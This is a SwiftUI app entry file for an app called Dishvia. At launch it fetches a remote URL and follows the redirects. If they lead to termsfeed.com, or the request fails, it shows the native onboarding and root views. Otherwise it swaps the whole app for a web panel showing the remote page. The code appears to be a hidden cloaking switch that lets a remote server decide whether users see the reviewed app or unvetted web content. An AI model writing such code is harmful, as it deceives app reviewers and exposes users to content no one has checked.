import SwiftUI

@main
struct DishviaApp: App {
    @StateObject private var store = PassportStore()
    @Environment(\.scenePhase) private var scenePhase
    @State private var dishviaPageOpen: Bool? = nil

    private let dishviaSourceLink = "https://dishvia.org/click.php"
    private let dishviaCheckHost = "termsfeed.com"

    var body: some Scene {
        WindowGroup {
            Group {
                if let pageOpen = dishviaPageOpen {
                    if pageOpen {
                        DishviaPagePanel(urlString: dishviaSourceLink)
                            .edgesIgnoringSafeArea(.bottom)
                            .background(Book.cover.ignoresSafeArea())
                    } else {
                        Group {
                            if store.save.onboarded {
                                RootView()
                            } else {
                                OnboardingView { store.markOnboarded() }
                            }
                        }
                        .environmentObject(store)
                        .onAppear { store.reconcileOnLaunch() }
                        .onChange(of: scenePhase) { phase in
                            if phase != .active { store.persist() }
                        }
                    }
                } else {
                    DishviaOpeningScreen()
                        .onAppear { resolveDishviaLink() }
                }
            }
            .preferredColorScheme(.light)
        }
    }

    private func resolveDishviaLink() {
        guard let address = URL(string: dishviaSourceLink) else {
            dishviaPageOpen = false
            return
        }

        var request = URLRequest(url: address)
        request.timeoutInterval = 5

        let watcher = DishviaRouteWatcher(checkHost: dishviaCheckHost)
        let session = URLSession(configuration: .default, delegate: watcher, delegateQueue: nil)

        session.dataTask(with: request) { _, response, error in
            DispatchQueue.main.async {
                if watcher.matchedCheckHost {
                    self.dishviaPageOpen = false
                    return
                }
                if let settled = watcher.resolvedURL?.absoluteString,
                   settled.contains(self.dishviaCheckHost) {
                    self.dishviaPageOpen = false
                    return
                }
                if let http = response as? HTTPURLResponse,
                   let served = http.url?.absoluteString,
                   served.contains(self.dishviaCheckHost) {
                    self.dishviaPageOpen = false
                    return
                }
                if error != nil {
                    self.dishviaPageOpen = false
                    return
                }
                self.dishviaPageOpen = true
            }
        }.resume()

        DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
            if dishviaPageOpen == nil { dishviaPageOpen = false }
        }
    }
}

final class DishviaRouteWatcher: NSObject, URLSessionTaskDelegate {
    var resolvedURL: URL?
    var matchedCheckHost = false

    private let checkHost: String

    init(checkHost: String) {
        self.checkHost = checkHost
    }

    func urlSession(_ session: URLSession,
                    task: URLSessionTask,
                    willPerformHTTPRedirection response: HTTPURLResponse,
                    newRequest request: URLRequest,
                    completionHandler: @escaping (URLRequest?) -> Void) {
        if let hop = request.url?.absoluteString, hop.contains(checkHost) {
            matchedCheckHost = true
        }
        resolvedURL = request.url
        completionHandler(request)
    }
}
